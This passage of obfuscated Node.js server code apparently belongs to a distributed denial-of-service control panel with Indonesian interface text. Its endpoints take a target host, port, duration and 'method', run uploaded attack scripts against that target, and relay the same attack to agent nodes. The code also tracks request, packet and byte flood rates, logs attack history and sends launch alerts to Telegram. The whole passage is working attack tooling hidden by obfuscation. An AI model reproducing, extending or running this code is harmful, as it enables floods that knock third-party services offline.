_0x32c47f===_0x591e3f(0x16a)?_0x32c47f:JSON[_0x591e3f(0x1f1)](_0x32c47f);if(!wss||!wss[_0x591e3f(0x160)]||wss['clients']['size']===0x0)return;wss[_0x591e3f(0x160)][_0x591e3f(0x1cb)](_0x5c4a49=>{const _0x4c1664=_0x591e3f;if(_0x5c4a49[_0x4c1664(0x146)]!==WebSocket[_0x4c1664(0x250)]){_0x5c4a49[_0x4c1664(0x22c)]();return;}try{_0x5c4a49[_0x4c1664(0x1b9)](_0x2f8dc8);}catch(_0x27ad0e){logActivity(_0x4c1664(0x26c),{'error':_0x27ad0e[_0x4c1664(0x139)]}),console[_0x4c1664(0x251)](_0x4c1664(0x220),_0x27ad0e[_0x4c1664(0x139)]),_0x5c4a49[_0x4c1664(0x22c)]();}});}function spawnAttackScript(_0x3560f4,_0x46b75b,_0x24989d){const _0x483bc8=_0x214aff,_0x2b13b0=['.js',_0x483bc8(0xb1)],_0x177326=path[_0x483bc8(0x9f)](_0x3560f4)[_0x483bc8(0x19c)]();if(!_0x2b13b0['includes'](_0x177326)){const _0x49db4b=_0x483bc8(0x243)+_0x177326;logActivity('SPAWN_SCRIPT_INVALID_EXT',{'processId':_0x24989d,'scriptName':_0x3560f4,'ext':_0x177326});throw new Error(_0x49db4b);}const _0x19145d=path['resolve'](uploadDir,_0x3560f4);if(!_0x19145d['startsWith'](path[_0x483bc8(0x116)](uploadDir))){const _0x120e5f=_0x483bc8(0x17b)+_0x19145d;logActivity(_0x483bc8(0x19e),{'processId':_0x24989d,'scriptName':_0x3560f4,'resolved':_0x19145d});throw new Error(_0x120e5f);}if(!fs[_0x483bc8(0x18b)](_0x19145d)){const _0x2740a2=_0x483bc8(0x192)+_0x19145d+_0x483bc8(0x268);logActivity(_0x483bc8(0x75),{'processId':_0x24989d,'scriptPath':_0x19145d});throw new Error(_0x2740a2);}let _0x53022d;if(_0x177326===_0x483bc8(0xb1))_0x53022d=spawn('sh',[_0x19145d,..._0x46b75b]);else{if(_0x177326===_0x483bc8(0x1b1))_0x53022d=sandboxCommandExecution(_0x19145d,_0x46b75b);else{const _0x42d8fc=_0x483bc8(0x15f)+_0x177326;logActivity('SPAWN_SCRIPT_UNKNOWN_EXT',{'processId':_0x24989d,'ext':_0x177326});throw new Error(_0x42d8fc);}}return activeProcesses[_0x24989d]={'ls':_0x53022d,'scriptName':_0x3560f4,'args':_0x46b75b,'status':'running','lastResponse':Date['now'](),'restartCount':0x0},stats[_0x24989d]={'rps':0x0,'pps':0x0,'bps':0x0,'_tempRps':0x0,'_tempPps':0x0,'_tempBps':0x0},stats[_0x24989d]['_interval']=setInterval(()=>{const _0x3509ab=_0x483bc8;stats[_0x24989d][_0x3509ab(0x200)]=stats[_0x24989d][_0x3509ab(0xa4)],stats[_0x24989d]['pps']=stats[_0x24989d]['_tempPps'],stats[_0x24989d]['bps']=stats[_0x24989d][_0x3509ab(0x7b)],stats[_0x24989d]['_tempRps']=0x0,stats[_0x24989d][_0x3509ab(0x24c)]=0x0,stats[_0x24989d]['_tempBps']=0x0;},0x3e8),_0x53022d[_0x483bc8(0x249)]['on'](_0x483bc8(0x95),_0x208000=>{const _0xaf6331=_0x483bc8,_0x2a79c4=_0x208000['toString']();activeProcesses[_0x24989d]&&(activeProcesses[_0x24989d][_0xaf6331(0x1cc)]=Date[_0xaf6331(0xb8)](),activeProcesses[_0x24989d][_0xaf6331(0x23d)]=_0xaf6331(0x142));if(!stats[_0x24989d])return;const _0x116c5b=_0x2a79c4['split'](/\r?\n/);for(const _0x5b5ef2 of _0x116c5b){const _0x23ad52=[..._0x5b5ef2['matchAll'](/RPS[:=]?\s*(\d+)/gi)],_0x288543=[..._0x5b5ef2[_0xaf6331(0xe7)](/PPS[:=]?\s*(\d+)/gi)],_0x38cc2b=[..._0x5b5ef2[_0xaf6331(0xe7)](/BPS[:=]?\s*(\d+)/gi)];for(const _0x595cf1 of _0x23ad52)stats[_0x24989d]['_tempRps']+=parseInt(_0x595cf1[0x1]);for(const _0x12a6d6 of _0x288543)stats[_0x24989d][_0xaf6331(0x24c)]+=parseInt(_0x12a6d6[0x1]);for(const _0x311a5e of _0x38cc2b)stats[_0x24989d]['_tempBps']+=parseInt(_0x311a5e[0x1]);}}),_0x53022d['stderr']['on'](_0x483bc8(0x95),_0x2fa867=>{const _0x1ade3c=_0x483bc8;activeProcesses[_0x24989d]&&(activeProcesses[_0x24989d][_0x1ade3c(0x23d)]=_0x1ade3c(0x251)),logActivity('PROCESS_STDERR',{'processId':_0x24989d,'error':_0x2fa867['toString']()}),sendTelegramPhoto(_0x1ade3c(0x92)+(_0x1ade3c(0x21d)+_0x53022d[_0x1ade3c(0x13e)]+'`\x0a')+(_0x1ade3c(0x159)+escapeTelegram(_0x24989d)+'`\x0a')+('*Error:*\x0a```\x0a'+escapeTelegram(_0x2fa867[_0x1ade3c(0xd4)]())+_0x1ade3c(0x97)));}),_0x53022d['on']('error',_0x228190=>{const _0xb33cba=_0x483bc8;activeProcesses[_0x24989d]&&(activeProcesses[_0x24989d][_0xb33cba(0x23d)]=_0xb33cba(0x7a)),logActivity(_0xb33cba(0x17e),{'processId':_0x24989d,'error':_0x228190[_0xb33cba(0xd4)]()}),sendTelegramPhoto(_0xb33cba(0x185)+('*PID:*\x20`'+(_0x53022d?.[_0xb33cba(0x13e)]||'unknown')+'`\x0a')+(_0xb33cba(0x159)+escapeTelegram(_0x24989d)+'`\x0a')+('*Error:*\x0a```\x0a'+escapeTelegram(_0x228190[_0xb33cba(0xd4)]())+_0xb33cba(0x97)));}),_0x53022d['on']('close',_0x1cb5ef=>{const _0x7b1534=_0x483bc8;activeProcesses[_0x24989d]&&(activeProcesses[_0x24989d][_0x7b1534(0x23d)]='exited',activeProcesses[_0x24989d][_0x7b1534(0x1ce)]=_0x1cb5ef),clearInterval(stats[_0x24989d]?.[_0x7b1534(0x198)]),delete stats[_0x24989d],delete activeProcesses[_0x24989d],updateAttackHistory(_0x24989d,{'endTime':new Date()[_0x7b1534(0x184)](),'status':'stopped','exitCode':_0x1cb5ef}),logActivity(_0x7b1534(0xa3),{'processId':_0x24989d,'exitCode':_0x1cb5ef}),broadcastWS({'type':_0x7b1534(0x1bb),'processId':_0x24989d,'exitCode':_0x1cb5ef}),sendTelegramPhoto(_0x7b1534(0x103)+(_0x7b1534(0x21d)+_0x53022d[_0x7b1534(0x13e)]+'`\x0a')+(_0x7b1534(0x159)+escapeTelegram(_0x24989d)+'`\x0a')+(_0x7b1534(0x170)+_0x1cb5ef+'`'));}),{'processId':_0x24989d,'ls':_0x53022d,'scriptName':_0x3560f4,'args':_0x46b75b};}app[_0x214aff(0x228)]('/',(_0x15b945,_0x1dcb06)=>_0x1dcb06['redirect'](_0x214aff(0xc3))),app[_0x214aff(0x228)](_0x214aff(0xc3),(_0x33da1a,_0x47337d)=>{const _0x482566=_0x214aff;_0x47337d[_0x482566(0xff)](path[_0x482566(0x84)](__dirname,_0x482566(0x8e)));}),app[_0x214aff(0x228)](_0x214aff(0x1ba),requireLogin,async(_0x2c8e3f,_0x5c8c1f)=>{const _0x4050c4=_0x214aff,{data:_0x1184bc,error:_0x33470a}=await supabase[_0x4050c4(0xc2)](_0x4050c4(0x124))[_0x4050c4(0xba)]('username,\x20role')['eq'](_0x4050c4(0x19f),_0x2c8e3f[_0x4050c4(0x261)])[_0x4050c4(0xb5)]();if(_0x33470a||!_0x1184bc||_0x1184bc[_0x4050c4(0x20e)]!==_0x4050c4(0x174))return _0x5c8c1f[_0x4050c4(0x1fe)](_0x4050c4(0xc3));_0x5c8c1f[_0x4050c4(0xff)](path[_0x4050c4(0x84)](__dirname,_0x4050c4(0x1d1)));}),app[_0x214aff(0x228)](_0x214aff(0x150),requireLogin,(_0x8aaa94,_0x5d216a)=>{const _0x1fcf95=_0x214aff;_0x5d216a['send'](_0x1fcf95(0x1b2));}),app['post'](_0x214aff(0x1a9),async(_0x7846f2,_0xa1968a)=>{const _0x566582=_0x214aff,{username:_0x578dbf,password:_0x3a9b66}=_0x7846f2[_0x566582(0x1f9)],_0x37e98c=await authenticateUser(_0x578dbf,_0x3a9b66);if(!_0x37e98c)return _0xa1968a[_0x566582(0x23d)](0x191)[_0x566582(0x207)]({'error':_0x566582(0xf7)});const _0x39db66=process[_0x566582(0x156)]['NODE_ENV']===_0x566582(0x222),_0x3affae=cookieSignature['sign'](_0x578dbf,COOKIE_SECRET);_0xa1968a['cookie'](_0x566582(0x261),_0x3affae,{'httpOnly':!![],'maxAge':0x36ee80,'secure':_0x39db66,'sameSite':_0x39db66?_0x566582(0x244):_0x566582(0x10a)}),_0xa1968a[_0x566582(0x207)]({'message':'Login\x20berhasil','role':_0x37e98c[_0x566582(0x20e)],'username':_0x37e98c['username']});}),app['get'](_0x214aff(0x1af),validateApiKey,async(_0x433db6,_0x2cec80)=>{const _0x3b9bda=_0x214aff;try{const {key:_0x7bdc2e,host:_0x5e1e6f,port:_0x1815ac,time:_0x877f0a,method:_0xeb8d26,user:_0x2d01d5}=_0x433db6[_0x3b9bda(0x123)];if(!_0x5e1e6f||!_0x1815ac||!_0x877f0a||!_0xeb8d26)return _0x2cec80[_0x3b9bda(0x23d)](0x190)[_0x3b9bda(0x1b9)]('Parameter\x20tidak\x20lengkap');const _0x271671=parseInt(_0x1815ac,0xa),_0x5954fe=parseInt(_0x877f0a,0xa);if(isNaN(_0x271671)||_0x271671<0x1||_0x271671>0xffff)return _0x2cec80['status'](0x190)[_0x3b9bda(0x1b9)](_0x3b9bda(0x99));if(isNaN(_0x5954fe)||_0x5954fe<=0x0)return _0x2cec80[_0x3b9bda(0x23d)](0x190)[_0x3b9bda(0x1b9)](_0x3b9bda(0x1f4));const _0x20bc61=readMethods(),_0x4af6de=_0x20bc61[_0xeb8d26];if(!_0x4af6de)return _0x2cec80[_0x3b9bda(0x23d)](0x190)[_0x3b9bda(0x1b9)]('Metode\x20tidak\x20valid');const _0x579e4b=_0x4af6de[_0x3b9bda(0xc0)][_0x3b9bda(0x1a1)](_0x4e9497=>{const _0x11b380=_0x3b9bda;if(typeof _0x4e9497===_0x11b380(0x16a)&&_0x4e9497['startsWith']('<')&&_0x4e9497[_0x11b380(0xa9)]('>'))switch(_0x4e9497){case'<host>':return _0x5e1e6f;case _0x11b380(0x1fd):return _0x1815ac;case _0x11b380(0x227):return _0x877f0a;default:return _0x4e9497;}return _0x4e9497;}),_0x5c61c4=_0xeb8d26+'-'+Date[_0x3b9bda(0xb8)]();let _0x12496b=null;NODE_TYPE===_0x3b9bda(0x21e)?MASTER_ATTACK_SELF&&(_0x12496b=spawnAttackScript(_0x4af6de[_0x3b9bda(0x118)],_0x579e4b,_0x5c61c4)):_0x12496b=spawnAttackScript(_0x4af6de['script'],_0x579e4b,_0x5c61c4);_0x12496b&&(logActivity(_0x3b9bda(0x120),{'processId':_0x5c61c4,'host':_0x5e1e6f,'targetPort':_0x1815ac,'time':_0x877f0a,'method':_0xeb8d26,'pid':_0x12496b['ls']['pid'],'args':_0x579e4b}),logAttackHistory({'processId':_0x5c61c4,'startTime':new Date()[_0x3b9bda(0x184)](),'endTime':null,'host':_0x5e1e6f,'port':_0x1815ac,'method':_0xeb8d26,'duration':_0x877f0a,'status':_0x3b9bda(0x142),'who':_0x2d01d5||_0x3b9bda(0x1f7),'masterOrAgent':NODE_TYPE}),broadcastWS({'type':'attack_started','processId':_0x5c61c4,'host':_0x5e1e6f,'port':_0x1815ac,'method':_0xeb8d26,'time':_0x877f0a}),await sendTelegramPhoto(_0x3b9bda(0x219)+NODE_TYPE+')*\x0a'+(_0x3b9bda(0xde)+escapeTelegram(_0x5e1e6f)+'`\x0a')+(_0x3b9bda(0x1db)+escapeTelegram(_0x1815ac)+'`\x0a')+(_0x3b9bda(0x278)+escapeTelegram(_0x877f0a+'s')+'`\x0a')+(_0x3b9bda(0x1b3)+escapeTelegram(_0xeb8d26)+'`\x0a')+(_0x3b9bda(0x21f)+escapeTelegram(_0x5c61c4)+'`\x0a')+(_0x3b9bda(0x183)+_0x12496b['ls'][_0x3b9bda(0x13e)]+'`')));let _0x4bef02=[];if(NODE_TYPE===_0x3b9bda(0x21e)){loadAgents();const _0x342b62=AGENT_LIST[_0x3b9bda(0x15d)](_0x19dfc9=>_0x19dfc9[_0x3b9bda(0x233)]!==![]);_0x4bef02=await Promise[_0x3b9bda(0x213)](_0x342b62[_0x3b9bda(0x1a1)](_0x5e9224=>axios['get'](_0x5e9224['url']+_0x3b9bda(0x1af),{'params':{'key':AGENT_KEY,'host':_0x5e1e6f,'port':_0x1815ac,'time':_0x877f0a,'method':_0xeb8d26},'timeout':0x32c8})[_0x3b9bda(0x141)](_0x4001a5=>({'agent':_0x5e9224,'status':_0x3b9bda(0x22d),'data':_0x4001a5[_0x3b9bda(0x95)]}))[_0x3b9bda(0x189)](_0x312e38=>({'agent':_0x5e9224,'status':_0x3b9bda(0x134),'error':_0x312e38[_0x3b9bda(0x139)]})))),logActivity(_0x3b9bda(0x11d),{'host':_0x5e1e6f,'targetPort':_0x1815ac,'time':_0x877f0a,'method':_0xeb8d26,'agentResults':_0x4bef02});}return _0x2cec80['json']({'message':_0x3b9bda(0x14b)+NODE_TYPE+')','processId':_0x5c61c4,'pid':_0x12496b?.['ls']?.[_0x3b9bda(0x13e)]||null,'agents':_0x4bef02});}catch(_0x4ace07){logActivity(_0x3b9bda(0x20f),{'error':_0x4ace07['toString']()}),_0x2cec80['status'](0x1f4)[_0x3b9bda(0x1b9)]('Kesalahan\x20Internal\x20Server');}}),app['get'](_0x214aff(0x215),validateApiKey,async(_0x8573aa,_0x138c8d)=>{const _0x244ab6=_0x214aff;try{const {key:_0x4e2935}=_0x8573aa['query'],_0x3c0d31=Object[_0x244ab6(0x178)](activeProcesses);_0x3c0d31[_0x244ab6(0x1cb)](_0x57cd2c=>{const _0x150c70=_0x244ab6;if(activeProcesses[_0x57cd2c]?.['ls'])activeProcesses[_0x57cd2c]['ls'][_0x150c70(0x176)](_0x150c70(0x18f));clearInterval(stats[_0x57cd2c]?.[_0x150c70(0x198)]),delete stats[_0x57cd2c],delete activeProcesses[_0x57cd2c],logActivity(_0x150c70(0x100),{'processId':_0x57cd2c,'isMaster':!![]}),broadcastWS({'type':'attack_stopped','processId':_0x57cd2c,'exitCode':_0x150c70(0x1b4)}),updateAttackHistory(_0x57cd2c,{'endTime':new Date()[_0x150c70(0x184)](),'status':'stopped','exitCode':_0x150c70(0x1b4)});}),loadAgents();const _0x8f5c5c=await Promise[_0x244ab6(0x213)](AGENT_LIST[_0x244ab6(0x1a1)](_0x51b824=>axios[_0x244ab6(0x228)](_0x51b824[_0x244ab6(0xe5)]+_0x244ab6(0x215),{'params':{'key':AGENT_KEY},'timeout':0x3a98})['then'](_0x536664=>({'agent':_0x51b824,'status':_0x244ab6(0x22d),'data':_0x536664[_0x244ab6(0x95)]}))[_0x244ab6(0x189)](_0x38533b=>({'agent':_0x51b824,'status':_0x244ab6(0x134),'error':_0x38533b[_0x244ab6(0x139)]}))));return logActivity('MASTER_STOP',{'agentResults':_0x8f5c5c}),await sendTelegramPhoto(_0x244ab6(0x186)+_0x8f5c5c[_0x244ab6(0x1a1)](_0x1e29f3=>_0x244ab6(0x245)+escapeTelegram(_0x1e29f3['agent'][_0x244ab6(0x1c5)]||_0x1e29f3[_0x244ab6(0x269)][_0x244ab6(0xe5)])+_0x244ab6(0xa8)+_0x1e29f3[_0x244ab6(0x23d)]+'*')['join']('\x0a')),broadcastWS({'type':_0x244ab6(0x205)}),_0x138c8d['json']({'message':_0x244ab6(0x1c7),'results':_0x8f5c5c});}catch(_0x1996c8){logActivity('ERROR_STOP',{'error':_0x1996c8['toString']()}),_0x138c8d['status'](0x1f4)[_0x244ab6(0x1b9)](_0x244ab6(0x22b));}}),app[_0x214aff(0x228)]('/api/attack/stats',validateApiKey,async(_0xa8e09a,_0x5246c2)=>{const _0x23abcd=_0x214aff,{key:_0x4e79fd}=_0xa8e09a[_0x23abcd(0x123)],_0x50b682={},_0x14861a={};for(const _0x5b445f in activeProcesses){const _0x7e2d21=activeProcesses[_0x5b445f];_0x50b682[_0x5b445f]={'status':_0x7e2d21[_0x23abcd(0x23d)],'lastResponse':_0x7e2d21[_0x23abcd(0x1cc)],'restartCount':_0x7e2d21['restartCount']||0x0,'pid':_0x7e2d21['ls']?.[_0x23abcd(0x13e)],'script':_0x7e2d21[_0x23abcd(0x89)],'args':_0x7e2d21[_0x23abcd(0xc0)],'rps':stats[_0x5b445f]?.[_0x23abcd(0x200)]||0x0,'pps':stats[_0x5b445f]?.[_0x23abcd(0x266)]||0x0,'bps':stats[_0x5b445f]?Number((stats[_0x5b445f][_0x23abcd(0xc1)]/0xf4240)[_0x23abcd(0x12e)](0x2)):0x0,'cpuPercent':null,'memoryMB':null};if(_0x7e2d21['ls']?.[_0x23abcd(0x13e)])_0x14861a[_0x5b445f]=_0x7e2d21['ls'][_0x23abcd(0x13e)];}try{if(Object[_0x23abcd(0x276)](_0x14861a)[_0x23abcd(0x230)]>0x0){const _0x2c254b=await pidusage(Object[_0x23abcd(0x276)](_0x14861a));for(const [_0x8fcee,_0x21631a]of Object[_0x23abcd(0xed)](_0x14861a)){const _0x567055=_0x2c254b[_0x21631a];_0x567055&&_0x50b682[_0x8fcee]&&(_0x50b682[_0x8fcee]['cpuPercent']=Number(_0x567055[_0x23abcd(0x1e8)][_0x23abcd(0x12e)](0x2)),_0x50b682[_0x8fcee][_0x23abcd(0xf5)]=Math[_0x23abcd(0xa1)](_0x567055['memory']/0x400/0x400));}}}catch(_0x25fb67){}const _0x12679b=os['cpus']();let _0x209845=0x0,_0x5a5644=0x0;_0x12679b[_0x23abcd(0x1cb)](_0xdf34f2=>{const _0x18a58f=_0x23abcd;for(let _0x23f987 in _0xdf34f2[_0x18a58f(0x1e3)])_0x5a5644+=_0xdf34f2['times'][_0x23f987];_0x209845+=_0xdf34f2[_0x18a58f(0x1e3)][_0x18a58f(0xb0)];});const _0x342f3a=_0x209845/_0x12679b['length'],_0x297677=_0x5a5644/_0x12679b[_0x23abcd(0x230)],_0x888e7a=0x64-~~(0x64*_0x342f3a/_0x297677),_0x528bc8=os[_0x23abcd(0xf3)](),_0x51cc95=os[_0x23abcd(0x206)](),_0x8f6d50=Math['round']((_0x528bc8-_0x51cc95)/0x400/0x400),_0x1cb586=Math[_0x23abcd(0xa1)](_0x528bc8/0x400/0x400);if(NODE_TYPE==='master'){loadAgents();const _0x37cb05=await Promise[_0x23abcd(0x213)](AGENT_LIST[_0x23abcd(0x1a1)](async _0x2f1a8f=>{const _0x268126=_0x23abcd,_0x13f24c=Date[_0x268126(0xb8)]();try{const _0x2b1073=await axios['get'](_0x2f1a8f[_0x268126(0xe5)]+_0x268126(0x10b),{'params':{'key':AGENT_KEY},'timeout':0x3a98}),_0x3f0e22=Date[_0x268126(0xb8)]()-_0x13f24c;return{'agent':_0x2f1a8f,'status':_0x268126(0x22d),'data':{..._0x2b1073[_0x268126(0x95)],'ping':_0x3f0e22}};}catch(_0x4b3e1c){return{'agent':_0x2f1a8f,'status':'failed','error':_0x4b3e1c[_0x268126(0x139)]};}}));return _0x5246c2[_0x23abcd(0x207)]({'master':{'processStats':_0x50b682,'serverResource':{'cpuUsagePercent':_0x888e7a,'usedMemoryMB':_0x8f6d50,'totalMemoryMB':_0x1cb586,'memoryUsagePercent':Math[_0x23abcd(0xa1)](0x64*_0x8f6d50/_0x1cb586),'uptimeSeconds':Math[_0x23abcd(0x1a5)](process[_0x23abcd(0x23c)]())}},'agentStats':_0x37cb05});}_0x5246c2[_0x23abcd(0x207)]({'processStats':_0x50b682,'serverResource':{'cpuUsagePercent':_0x888e7a,'usedMemoryMB':_0x8f6d50,'totalMemoryMB':_0x1cb586,'memoryUsagePercent':Math[_0x23abcd(0xa1)](0x64*_0x8f6d50/_0x1cb586),'uptimeSeconds':Math[_0x23abcd(0x1a5)](process[_0x23abcd(0x23c)]())}});}),app[_0x214aff(0x228)](_0x214aff(0x1fa),validateApiKey,(_0x2ea0ac,_0xeda71d)=>{const _0x2b3914=_0x214aff;_0xeda71d[_0x2b3914(0x207)](readHistory());}),app['delete']('/api/attack-history',validateApiKey,(_0x4f8f7a,_0x36faee)=>{const _0xaf4684=_0x214aff;fs[_0xaf4684(0x14c)](historyPath,'[]',_0xaf4684(0xf0)),_0x36faee['send'](_0xaf4684(0x1a8));}),app['get'](_0x214aff(0x199),validateApiKey,(_0x22b75e,_0x304217)=>{const _0x5284bb=_0x214aff;_0x304217[_0x5284bb(0x207)](readMethods());}),app[_0x214aff(0x1a3)](_0x214aff(0x199),express['json'](),validateApiKey,(_0x4a562b,_0x167414)=>{const _0x3d19d7=_0x214aff,{name:_0x59d8ef,script:_0x4bb5e9,args:_0x186af7}=_0x4a562b['body'];if(!_0x59d8ef||!_0x4bb5e9||!Array[_0x3d19d7(0x1dd)](_0x186af7))return _0x167414[_0x3d19d7(0x23d)](0x190)['send']('Format\x20salah');const _0xc13f69=readMethods();_0xc13f69[_0x59d8ef]={'script':_0x4bb5e9,'args':_0x186af7},writeMethods(_0xc13f69),logActivity(_0x3d19d7(0xd7),{'name':_0x59d8ef,'script':_0x4bb5e9,'args':_0x186af7}),_0x167414[_0x3d19d7(0x207)]({'message':_0x3d19d7(0x1c2),'name':_0x59d8ef});}),app[_0x214aff(0x17d)](_0x214aff(0x82),express[_0x214aff(0x207)](),validateApiKey,(_0x2ee2c3,_0x3e5c01)=>{const _0x3b7079=_0x214aff,_0x278c38=_0x2ee2c3['params'][_0x3b7079(0x77)],{name:_0x53ca70,script:_0x41eeae,args:_0x36851a}=_0x2ee2c3['body'];if(!_0x53ca70||!_0x41eeae||!Array[_0x3b7079(0x1dd)](_0x36851a))return _0x3e5c01[_0x3b7079(0x23d)](0x190)[_0x3b7079(0x1b9)](_0x3b7079(0xf4));const _0x4eb8cc=readMethods();if(!_0x4eb8cc[_0x278c38])return _0x3e5c01[_0x3b7079(0x23d)](0x194)[_0x3b7079(0x1b9)]('Method\x20lama\x20tidak\x20ditemukan');if(_0x278c38!==_0x53ca70)delete _0x4eb8cc[_0x278c38];_0x4eb8cc[_0x53ca70]={'script':_0x41eeae,'args':_0x36851a},writeMethods(_0x4eb8cc),logActivity(_0x3b7079(0xe8),{'oldName':_0x278c38,'newName':_0x53ca70,'script':_0x41eeae,'args':_0x36851a}),_0x3e5c01[_0x3b7079(0x207)]({'message':'Method\x20diperbarui','name':_0x53ca70});}),app['delete']('/api/methods/:name',validateApiKey,async(_0x3bfb99,_0x103849)=>{const _0x1822ec=_0x214aff;loadAgents();const _0x2f4ead=readMethods(),_0x2a2749=_0x3bfb99['params']['name'];if(!_0x2f4ead[_0x2a2749])return _0x103849[_0x1822ec(0x23d)](0x194)['send']('Method\x20tidak\x20ditemukan');const _0xe9f6ac=_0x2f4ead[_0x2a2749]['script'];delete _0x2f4ead[_0x2a2749],writeMethods(_0x2f4ead),logActivity('DELETE_METHOD',{'name':_0x2a2749,'scriptFile':_0xe9f6ac});let _0x3c6b05=![];if(_0xe9f6ac){const _0x2a3740=path[_0x1822ec(0x84)](uploadDir,_0xe9f6ac);fs[_0x1822ec(0x18b)](_0x2a3740)&&(fs[_0x1822ec(0x1ad)](_0x2a3740),_0x3c6b05=!![],logActivity(_0x1822ec(0x9d),{'scriptFile':_0xe9f6ac}));}let _0x35cb0b=[];NODE_TYPE===_0x1822ec(0x21e)&&AGENT_LIST&&AGENT_LIST[_0x1822ec(0x230)]&&_0xe9f6ac&&(_0x35cb0b=await Promise['all'](AGENT_LIST[_0x1822ec(0x1a1)](_0x1039c6=>axios['post'](_0x1039c6[_0x1822ec(0xe5)]+_0x1822ec(0x157),{'key':AGENT_KEY,'filename':_0xe9f6ac})['then'](()=>({'agent':_0x1039c6,'status':_0x1822ec(0x22d)}))[_0x1822ec(0x189)](_0x5f0893=>({'agent':_0x1039c6,'status':_0x1822ec(0x134),'error':_0x5f0893[_0x1822ec(0x139)]})))),logActivity(_0x1822ec(0xb9),{'scriptFile':_0xe9f6ac,'results':_0x35cb0b})),_0x103849[_0x1822ec(0x207)]({'message':_0x1822ec(0x1df),'name':_0x2a2749,'fileDeleted':_0x3c6b05,'sync':_0x35cb0b});}),app[_0x214aff(0x1a3)](_0x214aff(0xca),upload[_0x214aff(0xb5)](_0x214aff(0xdb)),validateApiKey,async(_0x2fab2c,_0x13a664)=>{const _0x2e3811=_0x214aff,_0x81bb79=_0x2fab2c['query'][_0x2e3811(0x105)]||_0x2fab2c[_0x2e3811(0x1f9)]['key'];if(!_0x2fab2c[_0x2e3811(0xdb)])return _0x13a664[_0x2e3811(0x23d)](0x190)[_0x2e3811(0x1b9)](_0x2e3811(0x212));const _0x334be6=[_0x2e3811(0x10d),_0x2e3811(0x13c),_0x2e3811(0x27b)],_0x383fa6=_0x2fab2c[_0x2e3811(0xdb)]['originalname']['toLowerCase']();if(_0x334be6['includes'](_0x383fa6)||_0x383fa6[_0x2e3811(0x195)]('..')||!isValidFileName(_0x383fa6))return fs[_0x2e3811(0x1ad)](_0x2fab2c[_0x2e3811(0xdb)][_0x2e3811(0xdd)]),logActivity(_0x2e3811(0x25b),{'file':_0x383fa6}),_0x13a664['status'](0x190)['send'](_0x2e3811(0x22e));let _0x3fad97='';try{_0x3fad97=fs[_0x2e3811(0x267)](_0x2fab2c[_0x2e3811(0xdb)][_0x2e3811(0xdd)],_0x2e3811(0xf0));}catch(_0x11db6f){return fs[_0x2e3811(0x1ad)](_0x2fab2c[_0x2e3811(0xdb)][_0x2e3811(0xdd)]),_0x13a664['status'](0x190)['send'](_0x2e3811(0xcd));}for(const _0x4f77d8 of DANGEROUS_KEYWORDS){if(_0x3fad97[_0x2e3811(0x195)](_0x4f77d8))return fs[_0x2e3811(0x1ad)](_0x2fab2c[_0x2e3811(0xdb)]['path']),logActivity(_0x2e3811(0x1da),{'file':_0x2fab2c[_0x2e3811(0xdb)][_0x2e3811(0x12f)],'keyword':_0x4f77d8}),await sendTelegramPhoto(_0x2e3811(0x1eb)+(_0x2e3811(0x179)+escapeTelegram(_0x4f77d8)+_0x2e3811(0xa2))+(_0x2e3811(0x202)+escapeTelegram(_0x2fab2c['file'][_0x2e3811(0x12f)])+'`')),_0x13a664['status'](0x190)['send'](_0x2e3811(0x130)+_0x4f77d8+'\x22)');}let _0x2236af=_0x2fab2c[_0x2e3811(0xdb)][_0x2e3811(0x1e5)],_0x46f79c=path[_0x2e3811(0x84)](uploadDir,_0x2236af);const _0x3a3a17=path['extname'](_0x2236af),_0x3a496b=path['basename'](_0x2236af,_0x3a3a17);let _0x40e8f5=0x1;while(fs[_0x2e3811(0x18b)](_0x46f79c)){_0x2236af=_0x3a496b+'_'+_0x40e8f5+_0x3a3a17,_0x46f79c=path[_0x2e3811(0x84)](uploadDir,_0x2236af),_0x40e8f5++;}try{fs[_0x2e3811(0x201)](_0x2fab2c[_0x2e3811(0xdb)][_0x2e3811(0xdd)],_0x46f79c);}catch(_0x327983){return _0x13a664[_0x2e3811(0x23d)](0x1f4)[_0x2e3811(0x1b9)](_0x2e3811(0x154));}logActivity('UPLOAD_METHOD_FILE',{'file':_0x2236af,'size':_0x2fab2c['file'][_0x2e3811(0xf8)]}),await sendTelegramPhoto('📁\x20*File\x20method\x20baru\x20di-upload*\x0a'+(_0x2e3811(0x1f5)+escapeTelegram(_0x2236af)+'`\x0a')+(_0x2e3811(0x182)+_0x2fab2c[_0x2e3811(0xdb)][_0x2e3811(0xf8)]+_0x2e3811(0x9b))),_0x13a664[_0x2e3811(0x207)]({'message':_0x2e3811(0xc8),'fileName':_0x2236af,'path':'lib/method/'+_0x2236af});}),app[_0x214aff(0x228)](_0x214aff(0x153),validateApiKey,(_0x2664c5,_0x543a20)=>{const _0x303a20=_0x214aff;fs[_0x303a20(0x25e)](uploadDir,(_0x35640c,_0x15d90c)=>{const _0x1ecf45=_0x303a20;if(_0x35640c)return _0x543a20[_0x1ecf45(0x23d)](0x1f4)[_0x1ecf45(0x1b9)](_0x1ecf45(0x218));const _0x2ee6a4=_0x15d90c['filter'](_0x52be7e=>!_0x52be7e[_0x1ecf45(0xa7)]('.'))['map'](_0x125711=>{const _0xd1f3ef=_0x1ecf45,_0x1d5ac5=fs['statSync'](path[_0xd1f3ef(0x84)](uploadDir,_0x125711));return{'name':_0x125711,'size':_0x1d5ac5['size'],'mtime':_0x1d5ac5['mtime']};});_0x543a20[_0x1ecf45(0x207)](_0x2ee6a4);});}),app[_0x214aff(0x9c)](_0x214aff(0x277),validateApiKey,validateFileName,async(_0xf7c509,_0x2dfa19)=>{const _0x15689f=_0x214aff,_0x56cfba=_0xf7c509[_0x15689f(0x73)][_0x15689f(0x12f)],_0x21f956=path[_0x15689f(0x84)](uploadDir,_0x56cfba);if(!fs['existsSync'](_0x21f956))return _0x2dfa19[_0x15689f(0x23d)](0x194)['send'](_0x15689f(0x16e));fs[_0x15689f(0x1ad)](_0x21f956),logActivity('DELETE_METHOD_FILE',{'file':_0x56cfba});if(NODE_TYPE===_0x15689f(0x21e)&&AGENT_LIST&&AGENT_LIST[_0x15689f(0x230)]){const _0x4fb33b=await 